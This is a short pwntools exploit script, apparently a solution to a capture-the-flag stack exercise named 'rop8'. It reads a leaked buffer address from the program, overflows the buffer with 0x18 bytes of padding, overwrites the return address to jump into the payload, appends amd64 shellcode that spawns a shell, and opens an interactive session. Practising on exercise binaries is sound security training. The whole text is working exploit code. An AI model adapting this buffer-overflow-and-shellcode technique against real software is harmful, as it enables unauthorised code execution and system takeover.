from pwn import *
r=process("./pwn/stack/rop-8/rop8")

context.arch="amd64"
context.terminal=["tmux","splitw","-h"]

ash=asm(shellcraft.sh())
print(r.recvline())

buf_addr=r.recvuntil(b'\n')[:-4].split(b'[')[1]#接收程序返回的地址
buf_addr=int(buf_addr,base=16)
print(hex(buf_addr))
payload=b'a'*0x18+p64(buf_addr+0x20)+ash

r.sendlineafter(b"Input someting : ",payload)
r.interactive()